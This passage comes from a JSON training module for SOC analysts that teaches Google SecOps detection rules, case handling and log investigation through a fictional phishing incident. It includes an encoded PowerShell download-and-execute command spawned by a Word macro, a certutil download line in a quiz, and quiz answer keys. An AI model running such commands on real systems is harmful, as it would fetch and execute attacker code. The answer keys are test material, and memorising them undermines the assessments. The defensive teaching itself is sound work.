rule sets for categories such as Cloud, Windows, Linux and macOS threats, plus Applied Threat Intelligence. Each set has precise rules (malicious threats with a high degree of confidence) and broad rules (suspicious behavior that is more common and produces more false positives). A Status toggle enables a set's precise or broad rules and an Alerting toggle decides whether detections alert. New sets start disabled with alerting off, and exclusions help control volume.\n\n### What an analyst asks\n\nDoes the window match how fast this attack really happens? Is the threshold above normal noise? Does the rule alert, or only record?",
        "codeExample": "rule kf_powershell_then_connection {\n  meta:\n    author = \"Kestrel SOC\"\n    description = \"PowerShell launched, then the same host made an outbound connection\"\n    severity = \"MEDIUM\"\n  events:\n    $proc.metadata.event_type = \"PROCESS_LAUNCH\"\n    $proc.target.process.file.full_path = /powershell\\.exe$/ nocase\n    $proc.principal.hostname = $host\n    $conn.metadata.event_type = \"NETWORK_CONNECTION\"\n    $conn.principal.hostname = $host\n    $conn.metadata.event_timestamp.seconds > $proc.metadata.event_timestamp.seconds\n  match:\n    $host over 10m\n  condition:\n    $proc and $conn\n}",
        "checkpoint": {
          "question": "Which rule section decides whether a detection actually fires?",
          "options": [
            "condition, for example a count threshold on an event variable",
            "meta, because severity decides which rules are allowed to fire",
            "match, because the window length alone decides what fires",
            "outcome, because every outcome variable becomes an alert"
          ],
          "answer": 0,
          "explanation": "The condition section holds the logic that must be true for a detection, such as #fail >= 5. meta only describes the rule. match defines the grouping variables and the window, but the condition still has to be met inside it. outcome calculates values that a condition can use, and does not raise alerts by itself."
        }
      },
      {
        "type": "query_fill",
        "id": "gso-yl1",
        "heading": "Write a YARA-L Rule: Office Starts a Script Host",
        "language": "yara-l",
        "context": "Turn the hunt into a detection. Priya wants a single-event rule that fires whenever Word, Excel, PowerPoint or Outlook launches PowerShell, cmd, wscript or mshta. A single-event rule has no match section, and its condition only needs the event variable to exist. Fill in the blanks.",
        "template": "rule kf_office_spawns_script_host {\n  meta:\n    author = \"Kestrel SOC\"\n    description = \"An Office application launched a script host\"\n    severity = \"HIGH\"\n  events:\n    $e.metadata.event_type = \"{{et}}\"\n    {{parent}} = /(winword|excel|powerpnt|outlook)\\.exe$/ nocase\n    {{child}} = /(powershell|cmd|wscript|mshta)\\.exe$/ nocase\n  condition:\n    {{cond}}\n}",
        "blanks": [
          {
            "id": "et",
            "answers": [
              "PROCESS_LAUNCH"
            ],
            "placeholder": "event type"
          },
          {
            "id": "parent",
            "answers": [
              "$e.principal.process.file.full_path"
            ],
            "placeholder": "event variable + the parent's path field"
          },
          {
            "id": "child",
            "answers": [
              "$e.target.process.file.full_path"
            ],
            "placeholder": "event variable + the child's path field"
          },
          {
            "id": "cond",
            "answers": [
              "$e"
            ],
            "placeholder": "condition"
          }
        ],
        "explanation": "In a rule, every UDM field is written behind its event variable, so the fields are $e.principal.process.file.full_path (the Office parent, the actor) and $e.target.process.file.full_path (the launched script host). A single-event rule needs no match window, and the condition $e simply means \"an event like this exists\". The sections stay in the fixed order meta, events, condition. Before you switch alerting on, run the rule as a retrohunt with alerting off and see how many legitimate add-ins or macros it catches, then add exclusions for the approved ones.",
        "xp": 25
      },
      {
        "type": "query_fill",
        "id": "gso-yl2",
        "heading": "Write a Multi-Event Rule: Failed Logons, Then a Success",
        "language": "yara-l",
        "context": "Priya needs a rule that fires when one account has at least five failed logons and then a successful one, all within 15 minutes. Kestrel's Windows logon events set security_result.action to FAIL on a failure and ALLOW on a success. The $user placeholder joins both event variables to one account. Fill in the blanks.",
        "template": "rule kf_failed_logons_then_success {\n  meta:\n    author = \"Kestrel SOC\"\n    severity = \"HIGH\"\n  events:\n    $fail.metadata.event_type = \"USER_LOGIN\"\n    $fail.security_result.action = \"{{fail_action}}\"\n    $fail.{{user_field}} = $user\n\n    $success.metadata.event_type = \"USER_LOGIN\"\n    $success.security_result.action = \"ALLOW\"\n    $success.target.user.userid = $user\n    $success.metadata.event_timestamp.seconds > $fail.metadata.event_timestamp.seconds\n  match:\n    {{match_var}} over {{window}}\n  outcome:\n    $fail_count = count($fail.metadata.id)\n  condition:\n    {{fail_cond}} and $success\n}",
        "blanks": [
          {
            "id": "fail_action",
            "answers": [
              "FAIL"
            ],
            "placeholder": "failure action"
          },
          {
            "id": "user_field",
            "answers": [
              "target.user.userid"
            ],
            "placeholder": "the account field on a logon"
          },
          {
            "id": "match_var",
            "answers": [
              "$user"
            ],
            "placeholder": "group by"
          },
          {
            "id": "window",
            "answers": [
              "15m"
            ],
            "placeholder": "window"
          },
          {
            "id": "fail_cond",
            "answers": [
              "#fail >= 5",
              "#fail>=5",
              "#fail > 4",
              "#fail>4",
              "$fail_count >= 5",
              "$fail_count>=5",
              "$fail_count > 4",
              "$fail_count>4"
            ],
            "placeholder": "at least five failures"
          }
        ],
        "explanation": "On USER_LOGIN the account is target.user.userid, so both variables bind it to $user, and match: $user over 15m groups each account's events into 15-minute windows. #fail counts the events bound to $fail (the outcome $fail_count holds the same number and can also be used in the condition), and a bare $success means at least one success exists. The timestamp comparison in events is what makes the success come after the failures. Tune it before alerting: a user who mistypes a password five times and then gets it right also matches, so look at the source host and the account type when it fires.",
        "xp": 30
      },
      {
        "type": "query_fill",
        "id": "gso-yl3",
        "heading": "Write an Aggregation Rule: One Source, Many Accounts",
        "language": "yara-l",
        "context": "A password spray is the opposite shape of a brute force: one source tries a few passwords against many accounts. Priya wants a rule that fires when a single source IP fails logons against more than 15 different accounts within 20 minutes. In a multi-event rule, outcome values are calculated with aggregation functions such as count(), count_distinct(), sum(), max() and min(). Fill in the blanks.",
        "template": "rule kf_password_spray_one_source {\n  meta:\n    author = \"Kestrel SOC\"\n    description = \"One source fails logons against many different accounts\"\n    severity = \"HIGH\"\n  events:\n    $e.metadata.event_type = \"USER_LOGIN\"\n    $e.security_result.action = \"FAIL\"\n    $e.{{src_field}} = $ip\n  match:\n    $ip over 20m\n  outcome:\n    $accounts = {{agg}}($e.target.user.userid)\n  condition:\n    $e and {{cond}}\n}",
        "blanks": [
          {
            "id": "src_field",
            "answers": [
              "principal.ip"
            ],
            "placeholder": "where a remote logon came from"
          },
          {
            "id": "agg",
            "answers": [
              "count_distinct"
            ],
            "placeholder": "aggregation function"
          },
          {
            "id": "cond",
            "answers": [
              "$accounts > 15",
              "$accounts>15",
              "$accounts >= 16",
              "$accounts>=16"
            ],
            "placeholder": "more than 15 accounts"
          }
        ],
        "explanation": "On a remote USER_LOGIN the source is principal, so $e.principal.ip = $ip groups the failures by the address they came from. count_distinct counts different account names, which is what separates a spray (many accounts, few tries each) from a brute force (one account, many tries); count() would fire on one account tried 16 times. An outcome variable can be used in the condition, so $accounts > 15 is the threshold. Watch for a VPN concentrator or a proxy as the source: many users legitimately share that IP, and it belongs in an exclusion.",
        "xp": 30
      },
      {
        "type": "question",
        "id": "gso-q4",
        "question": "Priya's rule below has been enabled for a month and never fired. A retrohunt over 30 days also finds nothing, yet UDM Search shows three launches of certutil.exe -urlcache -f http://198.51.100.77/a.bin on kf-ws-0262 in that period.\n\nrule kf_certutil_download {\n  meta:\n    severity = \"MEDIUM\"\n  events:\n    $e.metadata.event_type = \"PROCESS_LAUNCH\"\n    $e.principal.process.file.full_path = /certutil\\.exe$/ nocase\n    $e.principal.process.command_line = /urlcache/ nocase\n  condition:\n    $e\n}\n\nWhat is wrong?",
        "options": [
          "The rule reads principal, which is the parent; certutil is the launched process, so both lines must use $e.target.process",
          "A single-event rule needs a match section, so add match: $e over 10m and the rule will fire",
          "A regular expression cannot be used on a file path field in YARA-L, so the path line must be an exact string",
          "A retrohunt can only look back seven days, so the three launches were too old for it to find"
        ],
        "answer": 0,
        "explanation": "On a PROCESS_LAUNCH the launched process is target and its parent is principal. As written, the rule looks for an event whose parent is certutil.exe with urlcache in the parent's command line, which almost never exists. Changing both lines to $e.target.process.file.full_path and $e.target.process.command_line fixes it. A single-event rule needs no match section, regex works on path fields, and a retrohunt's range is chosen by you (one week is only the default). The habit to keep: after writing a rule, search UDM for an event you know should match and check every field in the rule against it.",
        "xp": 15
      },
      {
        "type": "question",
        "id": "gso-q3",
        "question": "Kestrel switched on the Windows Threats curated rule set with Status and Alerting on for both precise and broad rules. The first week brings many alerts on approved admin scripts, all from broad rules. What is the best response?",
        "options": [
          "Leave precise alerting on, set broad alerting off, and add exclusions for the approved admin scripts",
          "Disable the whole rule set, because broad rules cannot be tuned once they have been enabled",
          "Turn alerting off for the precise rules as well, so both kinds of alert are handled the same way",
          "Delete the curated rules and rewrite each of them by hand as a custom YARA-L rule"
        ],
        "answer": 0,
        "explanation": "Precise rules find malicious threats with high confidence, so their alerts are worth keeping. Broad rules look for suspicious behavior that is more common and produces more false positives, so you can keep their detections without alerts while you review them, and exclusions remove known-good activity such as approved scripts. Disabling the set throws away the precise coverage. Turning off precise alerting hides the high-confidence signal. Rewriting curated rules loses Google's maintenance and is far more work than tuning.",
        "xp": 10
      },
      {
        "type": "reading",
        "id": "gso-r6",
        "heading": "SOAR: Cases, the Case Wall and Playbooks",
        "content": "**From alert to case.** When a detection alerts, the alert reaches the SOAR side of Google SecOps. SOAR parses its events and key indicators. Indicators such as IPs, file hashes and user accounts become entities: persistent objects that keep enrichment data, analyst comments and history. Alerts are grouped into cases based on shared entities and configurable rules, so three alerts about one laptop arrive as one case rather than three tickets. Analysts can also create cases by hand, or simulate them for training.\n\n### Reading a case\n\n| Where | What you do there |\n|---|---|\n| Case Overview tab | See pending actions that need your input, the case description, the grouped alerts with their names, event counts and priority, and recent activity |\n| Alerts and events | Read the raw evidence behind each alert |\n| Entities | See every host, user, IP and hash, with enrichment |\n| Case Wall | The chronological log from creation to closure: tasks, comments, manual and system actions, attachments. Write what you found and did here |\n\n### Playbooks\n\nA playbook has a trigger (the mandatory start condition), actions (enrich data, notify people, isolate a host) and flows (if-then-else branches). Only one playbook attaches automatically to an alert, chosen by priority. The Playbook Simulator lets you test without touching real systems.\n\nPlaybooks work at two scopes. An alert playbook runs its actions separately for each alert. A case playbook runs across the whole case: one action serves the entire case, only alerts with an Open status are processed, and entities from all alerts are merged into one list with duplicates removed by default, so enrichment is done once per entity.\n\n### The analyst's order of work\n\n1. Read the overview: which alerts are grouped, and which entity do they share?\n2. Enrich the entities. Prevalence and intelligence tell you what is rare and what is known.\n3. Verify against the evidence and, where an action could disrupt people, against the owner (IT, the user, a change ticket).\n4. Contain only when you are confident, and ask for approval where the playbook requires it.\n5. Document findings and actions on the Case Wall.\n6. Close the case. In the Close Case dialog you pick a reason first (Malicious, Not malicious, Maintenance or Inconclusive) and then a root cause. Comments you add are posted to the Case Wall.\n\n### Why verification matters\n\nAutomation is fast and literal. A playbook that isolates a host stops a beacon, and it also stops a finance laptop from submitting payments. The verification step is where the analyst's judgement sits, so do not let it become a click.\n\n### What an analyst asks\n\nWhich alerts in this case are the same story, and which only share an entity by coincidence? What has already run on the Case Wall? What would I regret doing without asking the owner?",
        "codeExample": "Case 6120  (illustrative layout)\nOverview : 5 alerts grouped on kf-lt-0319 | priority High\nCase Wall:\n  09:58  Playbook \"Enrich entities\"        Completed\n  10:03  Analyst comment                   Domain prevalence is 3 assets, all Finance\n  10:06  Playbook \"Isolate host\"           Pending approval\n  10:20  Analyst closes alert 5            Reason: Maintenance",
        "checkpoint": {
          "question": "In the Close Case dialog, what must you choose before you can pick a root cause?",
          "options": [
            "A closure reason, such as Malicious, Not malicious, Maintenance or Inconclusive",
            "An assignee, because the root cause list depends on who owns the case",
            "A playbook, because a root cause is recorded by the last playbook that ran",
            "A tag name, because root causes are filtered by the tags on the case"
          ],
          "answer": 0,
          "explanation": "The root cause menu unlocks only after you select a reason, and each root cause is tied to a reason. Assignee, playbook and tag do not determine the list. Your comments in the dialog are posted to the Case Wall."
        }
      },
      {
        "type": "log_analysis",
        "id": "gso-la1",
        "heading": "Investigate: A Document Opens, PowerShell Starts",
        "context": "Case 6130 at Kestrel Freight. Customer service agent l.okoye reported an invoice email at 10:12 and opened its attachment from Downloads. SecOps grouped three alerts on kf-ws-0188 into the case; this is the first. The encoded argument below is base64 of UTF-16LE text. You decoded it and it reads: IEX ((New-Object Net.WebClient).DownloadString('https://kestrel-assets-cdn.example/p'))",
        "event": {
          "id": "evt-gso-la1-001",
          "ts": "2026-11-06T10:14:52.000Z",
          "source": "siem",
          "vendor": "Google SecOps",
          "event_type": "process_create",
          "severity": "high",
          "hostname": "kf-ws-0188",
          "user_title": "Customer Service Agent",
          "user": {
            "full_name": "L. Okoye",
            "email": "l.okoye@kestrelfreight.example",
            "department": "Customer Service"
          },
          "process": {
            "name": "powershell.exe",
            "pid": 7240,
            "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "parent_name": "WINWORD.EXE",
            "parent_pid": 4312,
            "cmdline": "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAGsAZQBzAHQAcgBlAGwALQBhAHMAcwBlAHQAcwAtAGMAZABuAC4AZQB4AGEAbQBwAGwAZQAvAHAAJwApACkA",
            "user": "KESTREL\\l.okoye",
            "integrity": "medium"
          },
          "description": "UDM PROCESS_LAUNCH event on kf-ws-0188, the first alert in case 6130.",
          "raw": {
            "metadata.event_timestamp": "2026-11-06T10:14:52Z",
            "metadata.event_type": "PROCESS_LAUNCH",
            "metadata.product_event_type": "1",
            "principal.hostname": "kf-ws-0188",
            "principal.asset.hostname": "kf-ws-0188",
            "principal.user.userid": "l.okoye",
            "principal.process.pid": "4312",
            "principal.process.file.full_path": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            "principal.process.command_line": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" \"C:\\Users\\l.okoye\\Downloads\\Invoice_KF-88213.docm\"",
            "target.process.pid": "7240",
            "target.process.file.full_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "target.process.file.sha256": "c137d995bd8ecba5c7340fece4e0ff8a12a21671ea8aced325489f28ce634b02",
            "target.process.command_line": "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAGsAZQBzAHQAcgBlAGwALQBhAHMAcwBlAHQAcwAtAGMAZABuAC4AZQB4AGEAbQBwAGwAZQAvAHAAJwApACkA"
          }
        },
        "questions": [
          {
            "question": "Which UDM field tells you what started PowerShell here?",
            "options": [
              "principal.process.file.full_path, because principal holds the parent that did the launching",
              "target.process.file.full_path, because target holds the process that started the launch",
              "target.process.command_line, because the encoded argument names the process that spawned it",
              "metadata.product_event_type, because event 1 always records a document application as parent"
            ],
            "answer": 0,
            "explanation": "On a PROCESS_LAUNCH the launched process is in target and its parent is in principal, so principal.process.file.full_path (WINWORD.EXE) is what started PowerShell. target.process.file.full_path is PowerShell itself. The command line holds arguments, not the parent. product_event_type is only the source's event ID (1 for process creation) and says nothing about the parent.",
            "xp": 10
          },
          {
            "question": "What makes this launch high-confidence evidence rather than routine PowerShell use?",
            "options": [
              "A word processor is the parent, and the child is a hidden-window PowerShell running an encoded command",
              "The SHA-256 of powershell.exe is unfamiliar, which proves the system binary was replaced",
              "The user is a standard user rather than an administrator, which PowerShell never allows",
              "PowerShell started at all on a workstation, and it never runs there during normal work"
            ],
            "answer": 0,
            "explanation": "Word spawning a shell is rare in normal work, and the hidden window plus an encoded argument is built to avoid being read, while the Downloads document in the parent's command line explains how it started. A hash cannot prove replacement on its own, and the file path is the normal System32 location. Standard users run PowerShell all the time. PowerShell is routine on many workstations, so its presence alone proves nothing.",
            "xp": 10
          },
          {
            "question": "After decoding, the command downloads from kestrel-assets-cdn.example. What is the best next step in SecOps?",
            "options": [
              "Open the domain view and search UDM for every asset that resolved or contacted the domain, to scope the case",
              "Close the alert, because PowerShell is a signed Microsoft binary and the launch was allowed",
              "Block the domain and close the case at once, without checking whether other assets contacted it",
              "Run a retrohunt of a curated rule set first, because UDM Search cannot look at past events"
            ],
            "answer": 0,
            "explanation": "The domain is the shared entity, so scope the incident: see its prevalence and which other assets resolved or connected to it, then contain and block. A signed binary does not make its use benign. Blocking without scoping leaves infected hosts you have not found, and closing before that is premature. UDM Search can search up to 365 days of stored events, so a retrohunt of a curated rule set is not a prerequisite for looking back.",
            "xp": 15
          }
        ]
      },
      {
        "type": "query_fill",
        "id": "gso-qf3",
        "heading": "Scope Case 6130: Who Else Talked to the Domain?",
        "language": "udm",
        "context": "The decoded PowerShell in case 6130 downloads from kestrel-assets-cdn.example. Before you block it, find every asset that resolved the domain or sent web requests to it. Lookups are NETWORK_DNS events; the proxy writes NETWORK_HTTP events with the requested host name in the target. Fill in the blanks, then run it over the last 7 days.",
        "template": "(metadata.event_type = \"{{et_dns}}\" AND network.dns.questions.name = \"{{domain}}\")\nOR\n(metadata.event_type = \"NETWORK_HTTP\" AND {{http_field}} = \"kestrel-assets-cdn.example\")",
        "blanks": [
          {
            "id": "et_dns",
            "answers": [
              "NETWORK_DNS"
            ],
            "placeholder": "event type for a lookup"
          },
          {
            "id": "domain",
            "answers": [
              "kestrel-assets-cdn.example"
            ],
            "placeholder": "the domain from the decoded command"
          },
          {
            "id": "http_field",
            "answers": [
              "target.hostname"
            ],
            "placeholder": "field for the requested host"
          }
        ],
        "explanation": "Parentheses keep each event type with its own field, and OR joins the two halves. A lookup's name is network.dns.questions.name; a web request's destination host is target.hostname. Group the results by principal.hostname: each host in the list is a candidate for the same infection, and a host that only resolved the domain without a PowerShell launch still needs its process history checked. Only after this list is complete do you block the domain, so you do not lose sight of hosts that already reached it.",
        "xp": 20
      },
      {
        "type": "written_report",
        "id": "gso-wr1",
        "heading": "Write the Case Wall Note and Close Case 6130",
        "context": "Case 6130 facts. 10:12 l.okoye opened Invoice_KF-88213.docm from Downloads on kf-ws-0188. 10:14:52 WINWORD.EXE launched powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand; decoded, it downloads https://kestrel-assets-cdn.example/p. 10:14:53 kf-ws-0188 resolved kestrel-assets-cdn.example and at 10:14:54 the proxy recorded a GET to it. Your scoping search over 7 days returned kf-ws-0188 only. 10:31 the Isolate host action ran on kf-ws-0188 after approval, and l.okoye's sessions were revoked. 10:40 the domain was blocked at the proxy. No change ticket mentions the document or the domain.",
        "prompt": "Write the note you would post on the Case Wall before closing: what happened, the evidence (host, user, file, parent and child process, domain), the scope, the actions taken and what is still open, and the close reason and root cause you will pick.",
        "rubricHints": [
          "Name the host, the user, the document, the parent and child process and the domain exactly as they appear in the case",
          "Say how you scoped it (which search, what range) and what it returned",
          "List actions with times, and say what is still open, such as reimaging or mail search for the same attachment",
          "Finish with the close reason (Malicious, Not malicious, Maintenance or Inconclusive) and a root cause"
        ],
        "referenceIocs": [
          "kf-ws-0188",
          "l.okoye",
          "Invoice_KF-88213.docm",
          "WINWORD.EXE",
          "powershell.exe",
          "kestrel-assets-cdn.example"
        ],
        "minWords": 120,
        "explanation": "A strong note reads like this: \"Malicious document execution on kf-ws-0188 (user l.okoye). At 10:12 the user opened Invoice_KF-88213.docm; at 10:14:52 WINWORD.EXE launched a hidden powershell.exe with an encoded command that downloads from kestrel-assets-cdn.example, which the host resolved and requested within two seconds. UDM Search over 7 days (NETWORK_DNS and NETWORK_HTTP for the domain) found no other asset. Actions: host isolated 10:31 with approval, sessions revoked, domain blocked at the proxy 10:40. Open: collect the document and the downloaded payload, search mail for the same attachment and sender, reimage before release, reset l.okoye's password. Close reason Malicious, root cause phishing attachment with macro.\" Writing it this way means the next analyst, or an auditor, can repeat every step from the Case Wall alone.",
        "xp": 40
      }
    ]
  }
];
